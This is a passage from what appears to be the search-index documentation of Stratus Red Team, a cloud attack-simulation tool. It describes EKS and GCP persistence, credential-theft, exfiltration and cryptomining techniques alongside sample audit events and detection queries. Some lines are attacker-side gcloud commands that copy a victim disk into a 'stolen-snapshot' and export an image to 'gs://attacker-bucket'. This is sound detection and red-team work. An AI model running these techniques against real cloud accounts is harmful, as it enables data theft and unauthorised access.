}\n}\n</code></pre>"},{"location":"attack-techniques/EKS/eks.persistence.backdoor-aws-auth-configmap/","title":"Backdoor aws-auth EKS ConfigMap","text":"<p>Platform: EKS</p>"},{"location":"attack-techniques/EKS/eks.persistence.backdoor-aws-auth-configmap/#mappings","title":"Mappings","text":"<ul> <li>MITRE ATT&amp;CK<ul> <li>Persistence</li> </ul> </li> <li>Privilege Escalation</li> </ul>"},{"location":"attack-techniques/EKS/eks.persistence.backdoor-aws-auth-configmap/#description","title":"Description","text":"<p>Backdoors the aws-auth ConfigMap in an EKS cluster to grant access to the cluster to a specific role.</p> <p>Warm-up:</p> <ul> <li>Create an IAM role</li> </ul> <p>Detonation:</p> <ul> <li>Add an entry to the aws-auth ConfigMap to grant administrator access to the cluster to the role</li> </ul> <p>References: </p> <ul> <li>https://securitylabs.datadoghq.com/articles/amazon-eks-attacking-securing-cloud-identities/#authorization-the-aws-auth-configmap-deprecated</li> <li>https://docs.aws.amazon.com/eks/latest/userguide/auth-configmap.html</li> </ul>"},{"location":"attack-techniques/EKS/eks.persistence.backdoor-aws-auth-configmap/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate eks.persistence.backdoor-aws-auth-configmap\n</code></pre>"},{"location":"attack-techniques/EKS/eks.persistence.backdoor-aws-auth-configmap/#detection","title":"Detection","text":"<p>Through EKS API Server audit logs, by looking for changes to the aws-auth ConfigMap in the kube-system namespace. Here's what a relevant audit event looks like:</p> <pre><code>{\n  \"objectRef\": {\n    \"apiVersion\": \"v1\",\n    \"resource\": \"configmaps\",\n    \"name\": \"aws-auth\"\n  },\n  \"requestURI\": \"/api/v1/namespaces/kube-system/configmaps/aws-auth\",\n  \"requestObject\": {\n    \"metadata\": {\n      \"resourceVersion\": \"184358280\",\n      \"name\": \"aws-auth\",\n      \"namespace\": \"kube-system\",\n      \"creationTimestamp\": \"2022-07-20T13:13:30Z\"\n    },\n    \"apiVersion\": \"v1\",\n    \"data\": {\n      \"mapRoles\": \"- groups:\\n    - system:masters\\n  rolearn: arn:aws:iam::012345678901:role/account-admin\\n  username: cluster-admin-{{SessionName}}\\n- groups:\\n    - system:bootstrappers\\n    - system:nodes\\n  rolearn: arn:aws:iam::012345678901:role/eksctl-cluser-NodeInstanceRole\\n  username: system:node:{{EC2PrivateDNSName}}\\n- groups:\\n    - system:masters\\n  rolearn: arn:aws:iam::012345678901:role/stratus-red-team-eks-backdoor-aws-auth-role\\n  username: backdoor\\n\"\n    },\n    \"kind\": \"ConfigMap\"\n  }\n}\n</code></pre>"},{"location":"attack-techniques/GCP/","title":"GCP","text":"<p>This page contains the Stratus attack techniques for GCP, grouped by MITRE ATT&amp;CK Tactic. Note that some Stratus attack techniques may correspond to more than a single ATT&amp;CK Tactic.</p>"},{"location":"attack-techniques/GCP/#initial-access","title":"Initial Access","text":"<ul> <li>Steal and Use the GCE Default Service Account Token from Outside Google Cloud</li> </ul>"},{"location":"attack-techniques/GCP/#persistence","title":"Persistence","text":"<ul> <li> <p>Register SSH public key to instance metadata</p> </li> <li> <p>Backdoor a GCP Service Account through its IAM Policy</p> </li> <li> <p>Create an Admin GCP Service Account</p> </li> <li> <p>Create a GCP Service Account Key</p> </li> <li> <p>Invite an External User to a GCP Project</p> </li> </ul>"},{"location":"attack-techniques/GCP/#privilege-escalation","title":"Privilege Escalation","text":"<ul> <li> <p>Create an Admin GCP Service Account</p> </li> <li> <p>Create a GCP Service Account Key</p> </li> <li> <p>Impersonate GCP Service Accounts</p> </li> </ul>"},{"location":"attack-techniques/GCP/#credential-access","title":"Credential Access","text":"<ul> <li> <p>Retrieve a High Number of Secret Manager secrets</p> </li> <li> <p>Steal and Use the GCE Default Service Account Token from Outside Google Cloud</p> </li> </ul>"},{"location":"attack-techniques/GCP/#discovery","title":"Discovery","text":"<ul> <li>Enumerate Permissions of a GCP Service Account</li> </ul>"},{"location":"attack-techniques/GCP/#lateral-movement","title":"Lateral Movement","text":"<ul> <li>Register SSH public key to instance metadata</li> </ul>"},{"location":"attack-techniques/GCP/#exfiltration","title":"Exfiltration","text":"<ul> <li> <p>Exfiltrate Compute Disk by sharing it</p> </li> <li> <p>Exfiltrate Compute Image by sharing it</p> </li> <li> <p>Exfiltrate Compute Disk by sharing a snapshot</p> </li> </ul>"},{"location":"attack-techniques/GCP/#impact","title":"Impact","text":"<ul> <li> <p>Create a GCE GPU Virtual Machine</p> </li> <li> <p>Create GCE Instances in Multiple Zones</p> </li> </ul>"},{"location":"attack-techniques/GCP/gcp.credential-access.secretmanager-retrieve-secrets/","title":"Retrieve a High Number of Secret Manager secrets","text":"<p>idempotent </p> <p>Platform: GCP</p>"},{"location":"attack-techniques/GCP/gcp.credential-access.secretmanager-retrieve-secrets/#mappings","title":"Mappings","text":"<ul> <li>MITRE ATT&amp;CK<ul> <li>Credential Access</li> </ul> </li> </ul>"},{"location":"attack-techniques/GCP/gcp.credential-access.secretmanager-retrieve-secrets/#description","title":"Description","text":"<p>Retrieves a high number of Secret Manager secrets in a short timeframe, through the AccessSecretVersion API.</p> <p>Warm-up: </p> <ul> <li>Create multiple secrets in Secret Manager.</li> </ul> <p>Detonation: </p> <ul> <li>Enumerate the secrets through the ListSecrets API</li> <li>Retrieve each secret value, one by one through the AccessSecretVersion API</li> </ul>"},{"location":"attack-techniques/GCP/gcp.credential-access.secretmanager-retrieve-secrets/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate gcp.credential-access.secretmanager-retrieve-secrets\n</code></pre>"},{"location":"attack-techniques/GCP/gcp.credential-access.secretmanager-retrieve-secrets/#detection","title":"Detection","text":"<p>Cloud Audit Logs event corresponding to accessing a secret's value is <code>AccessSecretVersion</code>.  It is considered data access event, and needs to be explicitly enabled for the Secret Manager API. </p> <p>Sample event:</p> <pre><code>{\n  \"protoPayload\": {\n    \"@type\": \"type.googleapis.com/google.cloud.audit.AuditLog\",\n    \"requestMetadata\": {\n      \"callerIp\": \"7.7.7.7\",\n      \"callerSuppliedUserAgent\": \"stratus-red-team_4fbc5d44-9c4f-469f-a15b-0c85e6ad3241 grpc-go/1.70.0,gzip(gfe)\",\n      \"requestAttributes\": {\n        \"time\": \"2025-02-02T22:56:34.343726445Z\",\n        \"auth\": {}\n      },\n      \"destinationAttributes\": {}\n    },\n    \"serviceName\": \"secretmanager.googleapis.com\",\n    \"methodName\": \"google.cloud.secretmanager.v1.SecretManagerService.AccessSecretVersion\",\n    \"authorizationInfo\": [\n      {\n        \"permission\": \"secretmanager.versions.access\",\n        \"granted\": true,\n        \"resourceAttributes\": {\n          \"service\": \"secretmanager.googleapis.com\",\n          \"name\": \"projects/victim-project/secrets/stratus-red-team-retrieve-secret-8/versions/latest\",\n          \"type\": \"secretmanager.googleapis.com/SecretVersion\"\n        },\n        \"permissionType\": \"DATA_READ\"\n      }\n    ],\n    \"resourceName\": \"projects/victim-project/secrets/stratus-red-team-retrieve-secret-8/versions/latest\",\n    \"request\": {\n      \"name\": \"projects/victim-project/secrets/stratus-red-team-retrieve-secret-8/versions/latest\",\n      \"@type\": \"type.googleapis.com/google.cloud.secretmanager.v1.AccessSecretVersionRequest\"\n    }\n  },\n  \"resource\": {\n    \"type\": \"audited_resource\",\n    \"labels\": {\n      \"method\": \"google.cloud.secretmanager.v1.SecretManagerService.AccessSecretVersion\",\n      \"project_id\": \"victim-project\",\n      \"service\": \"secretmanager.googleapis.com\"\n    }\n  }\n}\n</code></pre> <p>References:</p> <ul> <li>https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-services/gcp-secrets-manager-enum.html</li> </ul>"},{"location":"attack-techniques/GCP/gcp.discovery.enumerate-permissions/","title":"Enumerate Permissions of a GCP Service Account","text":"<p>idempotent </p> <p>Platform: GCP</p>"},{"location":"attack-techniques/GCP/gcp.discovery.enumerate-permissions/#mappings","title":"Mappings","text":"<ul> <li>MITRE ATT&amp;CK<ul> <li>Discovery</li> </ul> </li> </ul>"},{"location":"attack-techniques/GCP/gcp.discovery.enumerate-permissions/#description","title":"Description","text":"<p>Enumerates permissions of a GCP service account by calling <code>projects.testIamPermissions</code> on a large number of permissions.</p> <p>This simulates an attacker who has compromised a service account key and is enumerating what the service account has access to.</p> <p>Warm-up:</p> <ul> <li>Create a GCP service account</li> <li>Grant a low-value permission set: Storage Object Viewer</li> <li>Create a service account key</li> </ul> <p>Detonation:</p> <ul> <li>Call <code>projects.testIamPermissions</code>, with chunks of 100 permissions each time</li> </ul> <p>References:</p> <ul> <li>https://securitylabs.datadoghq.com/articles/google-cloud-default-service-accounts/#enumerating-permissions-of-the-associated-service-account</li> <li>https://docs.cloud.google.com/iam/docs/reference/rest/v1/permissions/queryTestablePermissions</li> <li>https://cloud.google.com/resource-manager/reference/rest/v1/projects/testIamPermissions</li> <li>https://docs.cloud.google.com/iam/docs/roles-permissions</li> </ul>"},{"location":"attack-techniques/GCP/gcp.discovery.enumerate-permissions/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate gcp.discovery.enumerate-permissions\n</code></pre>"},{"location":"attack-techniques/GCP/gcp.discovery.enumerate-permissions/#detection","title":"Detection","text":"<p>Monitor repeated calls to <code>projects.testIamPermissions</code> from the same service account.</p> <p>Warning</p> <p>These events are in Data Access audit logs, which are disabled by default. Enable Data Access logging for Resource Manager to capture this behavior.</p>"},{"location":"attack-techniques/GCP/gcp.exfiltration.share-compute-disk/","title":"Exfiltrate Compute Disk by sharing it","text":"<p>idempotent </p> <p>Platform: GCP</p>"},{"location":"attack-techniques/GCP/gcp.exfiltration.share-compute-disk/#mappings","title":"Mappings","text":"<ul> <li>MITRE ATT&amp;CK<ul> <li>Exfiltration</li> </ul> </li> </ul>"},{"location":"attack-techniques/GCP/gcp.exfiltration.share-compute-disk/#description","title":"Description","text":"<p>Exfiltrates a Compute Disk by sharing with a fictitious attacker account. The attacker could then create a snapshot of the disk in their GCP project.</p> <p>Warm-up:</p> <ul> <li>Create a Compute Disk</li> </ul> <p>Detonation:</p> <ul> <li>Set the IAM policy of the disk so that the attacker account has permissions to read the disk in their own project</li> </ul> <p>Note</p> <p>Since the target e-mail must exist for this attack simulation to work, Stratus Red Team grants the role to stratusredteam@gmail.com by default. This is a real Google account, owned by Stratus Red Team maintainers and that is not used for any other purpose than this attack simulation. However, you can override this behavior by setting the environment variable <code>STRATUS_RED_TEAM_ATTACKER_EMAIL</code>, for instance:</p> <pre><code>export STRATUS_RED_TEAM_ATTACKER_EMAIL=\"your-own-gmail-account@gmail.com\"\nstratus detonate gcp.exfiltration.share-compute-disk\n</code></pre>"},{"location":"attack-techniques/GCP/gcp.exfiltration.share-compute-disk/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate gcp.exfiltration.share-compute-disk\n</code></pre>"},{"location":"attack-techniques/GCP/gcp.exfiltration.share-compute-disk/#detection","title":"Detection","text":"<p>You can detect when someone changes the IAM policy of a Compute Disk, using the GCP Admin Activity audit logs event <code>v1.compute.disks.setIamPolicy</code>. Here's a sample event, shortened for clarity:</p> <pre><code>{\n  \"protoPayload\": {\n    \"@type\": \"type.googleapis.com/google.cloud.audit.AuditLog\",\n    \"authenticationInfo\": {\n      \"principalEmail\": \"user-sharing-the-disk@domain.tld\",\n      \"principalSubject\": \"user:user-sharing-the-disk@domain.tld\"\n    },\n    \"requestMetadata\": {\n      \"callerIp\": \"34.33.32.31\",\n      \"callerSuppliedUserAgent\": \"google-cloud-sdk gcloud/...\"\n    },\n    \"resourceName\": \"projects/victim-project/zones/us-central1-a/disks/stratus-red-team-victim-disk\",\n    \"request\": {\n      \"policy\": {\n        \"version\": \"3\",\n        \"bindings\": [\n          {\n            \"role\": \"roles/owner\",\n            \"members\": [\n              \"user:attacker@gmail.com\"\n            ]\n          }\n        ]\n      },\n      \"@type\": \"type.googleapis.com/compute.disks.setIamPolicy\"\n    }\n  }\n}\n</code></pre> <p>After the attacker has permissions on the Compute Disk, they can create a snapshot of it in their own GCP project using:</p> <pre><code>gcloud compute snapshots create stolen-snapshot \\\n    --source-disk https://www.googleapis.com/compute/v1/projects/victim-project/zones/us-central1-a/disks/stratus-red-team-victim-disk\n</code></pre> <p>When they do so, a GCP Admin Activity event <code>v1.compute.snapshots.insert</code> is generated in the victim project,  indicating that the attacker has not only shared but also actively stolen data from the disk (sample event shortened below):</p> <pre><code>{\n  \"protoPayload\": {\n    \"@type\": \"type.googleapis.com/google.cloud.audit.AuditLog\",\n    \"authenticationInfo\": {\n      \"principalEmail\": \"attacker@gmail.com\",\n      \"principalSubject\": \"user:attacker@gmail.com\"\n    },\n    \"requestMetadata\": {\n      \"callerSuppliedUserAgent\": \"google-cloud-sdk gcloud/...\",\n      // Note: the IP of the attacker is not logged in this event\n    },\n    \"serviceName\": \"compute.googleapis.com\",\n    \"methodName\": \"v1.compute.snapshots.insert\",\n    \"resourceName\": \"projects/victim-project/zones/us-central1-a/disks/stratus-red-team-victim-disk\",\n    \"request\": {\n      \"@type\": \"type.googleapis.com/compute.snapshots.insert\"\n    },\n    \"metadata\": {\n      \"@type\": \"type.googleapis.com/google.cloud.audit.CrossEntityControlAuditMetadata\"\n    }\n  }\n}\n</code></pre> <p>Based on these events, detection strategies may include:</p> <ul> <li>Alerting when the IAM policy of a Compute Disk is changed, especially if such a sharing mechanism is not part of your normal operations. Sample GCP Logs Explorer query:</li> </ul> <pre><code>protoPayload.methodName=\"v1.compute.disks.setIamPolicy\"\n</code></pre> <ul> <li>Alerting when someone with an unexpected e-mail domain creates a snapshot of a Compute Disk. Sample GCP Logs Explorer query:</li> </ul> <pre><code>protoPayload.methodName=\"v1.compute.snapshots.insert\"\nNOT protoPayload.authenticationInfo.principalEmail=~\".+@your-domain.tld$\"\n</code></pre>"},{"location":"attack-techniques/GCP/gcp.exfiltration.share-compute-image/","title":"Exfiltrate Compute Image by sharing it","text":"<p>slow idempotent </p> <p>Platform: GCP</p>"},{"location":"attack-techniques/GCP/gcp.exfiltration.share-compute-image/#mappings","title":"Mappings","text":"<ul> <li>MITRE ATT&amp;CK<ul> <li>Exfiltration</li> </ul> </li> </ul>"},{"location":"attack-techniques/GCP/gcp.exfiltration.share-compute-image/#description","title":"Description","text":"<p>Exfiltrates a Compute Image by sharing with a fictitious attacker account. The attacker could then create a snapshot of the image in their GCP project.</p> <p>Warm-up:</p> <ul> <li>Create a Compute Image</li> </ul> <p>Detonation:</p> <ul> <li>Set the IAM policy of the image so that the attacker account has permissions to read the image in their own project</li> </ul> <p>Note</p> <p>Since the target e-mail must exist for this attack simulation to work, Stratus Red Team grants the role to stratusredteam@gmail.com by default. This is a real Google account, owned by Stratus Red Team maintainers and that is not used for any other purpose than this attack simulation. However, you can override this behavior by setting the environment variable <code>STRATUS_RED_TEAM_ATTACKER_EMAIL</code>, for instance:</p> <pre><code>export STRATUS_RED_TEAM_ATTACKER_EMAIL=\"your-own-gmail-account@gmail.com\"\nstratus detonate gcp.exfiltration.share-compute-image\n</code></pre>"},{"location":"attack-techniques/GCP/gcp.exfiltration.share-compute-image/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate gcp.exfiltration.share-compute-image\n</code></pre>"},{"location":"attack-techniques/GCP/gcp.exfiltration.share-compute-image/#detection","title":"Detection","text":"<p>You can detect when someone changes the IAM policy of a Compute Image, using the GCP Admin Activity audit logs event <code>v1.compute.images.setIamPolicy</code>. Here's a sample event, shortened for clarity:</p> <pre><code>{\n  \"protoPayload\": {\n    \"@type\": \"type.googleapis.com/google.cloud.audit.AuditLog\",\n    \"authenticationInfo\": {\n      \"principalEmail\": \"user-sharing-the-image@domain.tld\",\n      \"principalSubject\": \"user:user-sharing-the-image@domain.tld\"\n    },\n    \"requestMetadata\": {\n      \"callerIp\": \"34.33.32.31\",\n      \"callerSuppliedUserAgent\": \"google-cloud-sdk gcloud/...\"\n    },\n    \"resourceName\": \"projects/victim-project/global/images/stratus-red-team-victim-image\",\n    \"request\": {\n      \"policy\": {\n        \"version\": \"3\",\n        \"bindings\": [\n          {\n            \"role\": \"roles/owner\",\n            \"members\": [\n              \"user:attacker@gmail.com\"\n            ]\n          }\n        ]\n      },\n      \"@type\": \"type.googleapis.com/compute.images.setIamPolicy\"\n    }\n  }\n}\n</code></pre> <p>After the attacker has permissions on the Compute Image, they can export it in their own GCP Storage using:</p> <pre><code>    gcloud compute images export \\\n    --destination-uri gs://attacker-bucket/victim-image \\\n    --image stratus-red-team-victim-image\n</code></pre> <p>Based on this event, detection strategies may include:</p> <ul> <li>Alerting when the IAM policy of a Compute Image is changed, especially if such a sharing mechanism is not part of your normal operations. Sample GCP Logs Explorer query:</li> </ul> <pre><code>protoPayload.methodName=\"v1.compute.images.setIamPolicy\"\n</code></pre>"},{"location":"attack-techniques/GCP/gcp.exfiltration.share-compute-snapshot/","title":"Exfiltrate Compute Disk by sharing a snapshot","text":"<p>idempotent </p> <p>Platform: GCP</p>"},{"location":"attack-techniques/GCP/gcp.exfiltration.share-compute-snapshot/#mappings","title":"Mappings","text":"<ul> <li>MITRE ATT&amp;CK<ul> <li>Exfiltration</li> </ul> </li> </ul>"},{"location":"attack-techniques/GCP/gcp.exfiltration.share-compute-snapshot/#description","title":"Description","text":"<p>Exfiltrates a Compute Disk by sharing a snapshot with a fictitious attacker account.</p> <p>Warm-up:</p> <ul> <li>Create a Compute Disk and a Snapshot</li> </ul> <p>Detonation:</p> <ul> <li>Set the IAM policy of the snapshot so that the attacker account has permissions to access it</li> </ul> <p>Note</p> <p>Since the target e-mail must exist for this attack simulation to work, Stratus Red Team grants the role to stratusredteam@gmail.com by default. This is a real Google account, owned by Stratus Red Team maintainers and that is not used for any other purpose than this attack simulation. However, you can override this behavior by setting the environment variable <code>STRATUS_RED_TEAM_ATTACKER_EMAIL</code>, for instance:</p> <pre><code>export STRATUS_RED_TEAM_ATTACKER_EMAIL=\"your-own-gmail-account@gmail.com\"\nstratus detonate gcp.exfiltration.share-compute-snapshot\n</code></pre>"},{"location":"attack-techniques/GCP/gcp.exfiltration.share-compute-snapshot/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate gcp.exfiltration.share-compute-snapshot\n</code></pre>"},{"location":"attack-techniques/GCP/gcp.exfiltration.share-compute-snapshot/#detection","title":"Detection","text":"<p>You can detect when someone changes the IAM policy of a Compute Snapshot, using the GCP Admin Activity audit logs event <code>v1.compute.snapshots.setIamPolicy</code>. Here's a sample event, shortened for clarity:</p> <pre><code>{\n  \"protoPayload\": {\n    \"@type\": \"type.googleapis.com/google.cloud.audit.AuditLog\",\n    \"authenticationInfo\": {\n      \"principalEmail\": \"user-sharing-the-snapshot@domain.tld\",\n      \"principalSubject\": \"user:user-sharing-the-snapshot@domain.tld\"\n    },\n    \"requestMetadata\": {\n      \"callerIp\": \"34.33.32.31\",\n      \"callerSuppliedUserAgent\": \"google-cloud-sdk gcloud/...\"\n    },\n    \"resourceName\": \"projects/victim-project/global/snapshots/stratus-red-team-victim-snapshot\",\n    \"request\": {\n      \"policy\": {\n        \"version\": \"3\",\n        \"bindings\": [\n          {\n            \"role\": \"roles/owner\",\n            \"members\": [\n              \"user:attacker@gmail.com\"\n            ]\n          }\n        ]\n      },\n      \"@type\": \"type.googleapis.com/compute.snapshots.setIamPolicy\"\n    }\n  }\n}\n</code></pre> <p>Based on these events, detection strategies may include:</p> <ul> <li>Alerting when the IAM policy of a Compute Snapshot is changed, especially if such a sharing mechanism is not part of your normal operations. Sample GCP Logs Explorer query:</li> </ul> <pre><code>protoPayload.methodName=\"v1.compute.snapshots.setIamPolicy\"\n</code></pre>"},{"location":"attack-techniques/GCP/gcp.impact.create-gpu-vm/","title":"Create a GCE GPU Virtual Machine","text":"<p>idempotent </p> <p>Platform: GCP</p>"},{"location":"attack-techniques/GCP/gcp.impact.create-gpu-vm/#mappings","title":"Mappings","text":"<ul> <li>MITRE ATT&amp;CK<ul> <li>Impact</li> </ul> </li> </ul>"},{"location":"attack-techniques/GCP/gcp.impact.create-gpu-vm/#description","title":"Description","text":"<p>Creates a GCE virtual machine instance with GPU accelerators, simulating an attacker creating GPU instances for cryptomining.</p> <p>Warm-up:</p> <ul> <li>None</li> </ul> <p>Detonation:</p> <ul> <li>Attempt to create a GCE instance with a GPU accelerator (nvidia-tesla-t4) attached</li> </ul> <p>Note: The instance creation may fail in GCP projects without GPU quota. However, the GCP audit log is still generated with the GPU accelerator request parameters, which is sufficient for detection rules to match on.</p> <p>\u26a0\ufe0f Warning: If the instance is successfully created, it will incur GPU costs. Make sure to revert the technique after detonation to clean up created resources and avoid unnecessary costs.</p> <p>References:</p> <ul> <li>https://www.mandiant.com/resources/blog/detecting-cryptomining-cloud</li> <li>https://cloud.google.com/blog/topics/threat-intelligence/detecting-cryptomining-using-vpc-flow-logs</li> </ul>"},{"location":"attack-techniques/GCP/gcp.impact.create-gpu-vm/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate gcp.impact.create-gpu-vm\n</code></pre>"},{"location":"attack-techniques/GCP/gcp.impact.create-gpu-vm/#detection","title":"Detection","text":"<p>Identify when GCE instances with GPU accelerators are created by monitoring for <code>v1.compute.instances.insert</code> or <code>beta.compute.instances.insert</code> events in GCP Admin Activity audit logs where the request includes <code>guestAccelerators</code>.</p> <p>Attackers frequently provision GPU-enabled VMs for cryptocurrency mining after compromising cloud credentials. GPU VMs are significantly more expensive than standard VMs and are rarely used in most environments.</p> <p>Detection criteria:</p> <ul> <li>Monitor <code>compute.instances.insert</code> events where the request contains <code>guestAccelerators.acceleratorCount</code></li> <li>Alert on any instance creation with GPU accelerators, especially from unusual principals or outside of normal change windows</li> <li>Consider higher severity when the caller IP is associated with known anonymizing proxies or botnets</li> </ul>"},{"location":"attack-techniques/GCP/gcp.impact.create-instances-in-multiple-zones/","title":"Create GCE Instances in Multiple Zones","text":"<p>Platform: GCP</p>"},{"location":"attack-techniques/GCP/gcp.impact.create-instances-in-multiple-zones/#mappings","title":"Mappings","text":"<ul> <li>MITRE ATT&amp;CK<ul> <li>Impact</li> </ul> </li> </ul>"},{"location":"attack-techniques/GCP/gcp.impact.create-instances-in-multiple-zones/#description","title":"Description","text":"<p>Creates GCE instances across multiple zones, simulating an attacker hijacking compute resources for cryptomining across multiple availability zones.</p> <p>Warm-up:</p> <ul> <li>None</li> </ul> <p>Detonation:</p> <ul> <li>Create 6 <code>e2-micro</code> GCE instances in parallel across 6 different zones in multiple regions</li> </ul> <p>\u26a0\ufe0f Warning: This technique creates real GCE instances. Make sure to revert the technique after detonation to clean up created resources and avoid unnecessary costs.</p> <p>References:</p> <ul> <li>https://www.mandiant.com/resources/blog/detecting-cryptomining-cloud</li> <li>https://cloud.google.com/blog/topics/threat-intelligence/detecting-cryptomining-using-vpc-flow-logs</li> </ul>"},{"location":"attack-techniques/GCP/gcp.impact.create-instances-in-multiple-zones/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate gcp.impact.create-instances-in-multiple-zones\n</code></pre>"},{"location":"attack-techniques/GCP/gcp.impact.create-instances-in-multiple-zones/#detection","title":"Detection","text":"<p>Identify when GCE instances are created across an unusually high number of zones by monitoring for <code>v1.compute.instances.insert</code> or <code>beta.compute.instances.insert</code> events in GCP Admin Activity audit logs.</p> <p>An attacker performing resource hijacking (e.g., cryptomining) typically creates instances across many zones to maximize resource availability and evade per-zone quotas.</p> <p>Detection criteria:</p> <ul> <li>Monitor <code>compute.instances.insert</code> events grouped by caller identity</li> <li>Count the number of distinct zones in which instances are created within a short time window (e.g., 5 minutes)</li> <li>Alert when the number of distinct zones exceeds a threshold (e.g., more than 5 zones)</li> <li>Exclude legitimate automation such as Managed Instance Groups (user agent containing <code>GCE Managed Instance Group</code>)</li> </ul>"},{"location":"attack-techniques/GCP/gcp.initial-access.use-compute-sa-outside-gcp/","title":"Steal and Use the GCE Default Service Account Token from Outside Google Cloud","text":"<p>slow idempotent </p> <p>Platform: GCP</p>"},{"location":"attack-techniques/GCP/gcp.initial-access.use-compute-sa-outside-gcp/#mappings","title":"Mappings","text":"<ul> <li>MITRE ATT&amp;CK<ul> <li>Credential Access</li> </ul> </li> <li>Initial Access</li> </ul>"},{"location":"attack-techniques/GCP/gcp.initial-access.use-compute-sa-outside-gcp/#description","title":"Description","text":"<p>Simulates the theft and use of GCE default service account credentials from outside of Google Cloud.</p> <p>When a GCE instance is created, it is assigned a default service account (<code>{project-number}-compute@developer.gserviceaccount.com</code>). If an attacker gains access to the instance (for example through an SSRF vulnerability, a compromised SSH key, or a command injection), they can extract the OAuth2 access token from the instance metadata service and use it from outside of Google Cloud.</p> <p>Warm-up:</p> <ul> <li>Create a GCE instance running with the default compute service account</li> <li>The instance runs a startup script that extracts the service account OAuth2 token from the instance metadata service and writes it to the serial port</li> </ul> <p>Detonation:</p> <ul> <li>Read the instance's serial port output to extract the stolen OAuth2 token</li> <li>Use the stolen token from outside Google Cloud to set labels on the GCE instance, generating a GCP Admin Activity audit log from a non-Google IP address</li> </ul> <p>References:</p> <ul> <li>https://about.gitlab.com/blog/plundering-gcp-escalating-privileges-in-google-cloud-platform/</li> <li>https://securitylabs.datadoghq.com/articles/google-cloud-default-service-accounts/</li> <li>https://cloud.google.com/compute/docs/access/service-accounts#default_service_account</li> </ul>"},{"location":"attack-techniques/GCP/gcp.initial-access.use-compute-sa-outside-gcp/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate gcp.initial-access.use-compute-sa-outside-gcp\n</code></pre>"},{"location":"attack-techniques/GCP/gcp.initial-access.use-compute-sa-outside-gcp/#detection","title":"Detection","text":"<p>Identify when a GCE default service account (<code>*-compute@developer.gserviceaccount.com</code>) is used from outside of Google Cloud by analyzing GCP audit logs.</p> <p>The GCE default service account should typically only be used from within Google Cloud (e.g., from a GCE instance). Usage from external IP addresses with non-GCE user agents indicates potentially stolen credentials.</p> <p>Detection criteria:</p> <ul> <li>Monitor GCP audit logs where the caller identity matches <code>*-compute@developer.gserviceaccount.com</code></li> <li>Filter for calls where the caller IP does not belong to Google's IP ranges</li> <li>Exclude calls with user agents containing <code>GCE</code> or <code>gcloud</code> (which indicate legitimate in-cloud usage)</li> </ul>"},{"location":"attack-techniques/GCP/gcp.lateral-movement.add-sshkey-instance-metadata/","title":"Register SSH public key to instance metadata","text":"<p>idempotent </p> <p>Platform: GCP</p>"},{"location":"attack-techniques/GCP/gcp.lateral-movement.add-sshkey-instance-metadata/#mappings","title":"Mappings","text":"<ul> <li>MITRE ATT&amp;CK<ul> <li>Lateral Movement</li> </ul> </li> <li>Persistence</li> </ul>"},{"location":"attack-techniques/GCP/gcp.lateral-movement.add-sshkey-instance-metadata/#description","title":"Description","text":"<p>Register a public key to the instance's metadata to allow login and gain access to the instance.</p> <p>Warm-up: </p> <ul> <li>Create a compute instance (Linux)</li> </ul> <p>Detonation:</p> <ul> <li>Create RSA key-pair (private key and public key)</li> <li>Register public key to instance's metadata.</li> <li>Print private key to stdout. </li> </ul> <p>Note that you need to save the private key for login.</p> <p>Reference: - https://cloud.google.com/sdk/gcloud/reference/compute/instances/add-metadata - https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/gcp-compute-privesc/gcp-add-custom-ssh-metadata.html</p>"},{"location":"attack-techniques/GCP/gcp.lateral-movement.add-sshkey-instance-metadata/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate gcp.lateral-movement.add-sshkey-instance-metadata\n</code></pre>"},{"location":"attack-techniques/GCP/gcp.lateral-movement.add-sshkey-instance-metadata/#detection","title":"Detection","text":"<p>Identify when an SSH key is added to a GCE instance's metadata through the GCP Admin Activity audit logs event <code>v1.compute.instances.setMetadata</code>.</p> <p>Monitor specifically for <code>setMetadata</code> calls where the <code>instanceMetadataDelta</code> contains modifications to the <code>ssh-keys</code> metadata key, especially from unexpected principals or service accounts.</p> <p>This technique corresponds to MITRE ATT&amp;CK T1098.004: Account Manipulation: SSH Authorized Keys.</p> <p>Sample event (shortened for readability):</p> <pre><code>{\n  \"logName\": \"projects/my-project-id/logs/cloudaudit.googleapis.com%2Factivity\",\n  \"protoPayload\": {\n    \"authenticationInfo\": {\n      \"principalEmail\": \"username@service.com\",\n    },\n    \"metadata\": {\n      \"instanceMetadataDelta\": {\n        \"addedMetadataKeys\": [\n          \"ssh-keys public-key-here\",\n        ],\n      },\n    },\n    \"serviceName\": \"compute.googleapis.com\",\n    \"methodName\": \"v1.compute.instances.setMetadata\",\n    \"resourceName\": \"projects/my-project-id/zones/my-zone-id/instances/my-instance-id\",\n  },\n  \"resource\": {\n    \"type\": \"gce_instance\"\n  },\n  \"severity\": \"NOTICE\"\n}\n</code></pre>"},{"location":"attack-techniques/GCP/gcp.persistence.backdoor-service-account-policy/","title":"Backdoor a GCP Service Account through its IAM Policy","text":"<p>idempotent </p> <p>Platform: GCP</p>"},{"location":"attack-techniques/GCP/gcp.persistence.backdoor-service-account-policy/#mappings","title":"Mappings","text":"<ul> <li>MITRE ATT&amp;CK<ul> <li>Persistence</li> </ul> </li> </ul>"},{"location":"attack-techniques/GCP/gcp.persistence.backdoor-service-account-policy/#description","title":"Description","text":"<p>Backdoors a GCP service account by granting a fictitious attacker the ability to impersonate it and generate access temporary tokens for it.</p> <p>Warm-up:</p> <ul> <li>Create a service account</li> </ul> <p>Detonation:</p> <ul> <li>Backdoor the IAM policy of the service account to grant the role <code>iam.serviceAccountTokenCreator</code> to a fictitious attacker</li> </ul> <p>Note that in GCP (contrary to AWS), the \"IAM policy\" of a service account is not granting permissions to the service account itself - rather, it's a resource-based policy that grants permissions to other identities to impersonate the service account.</p> 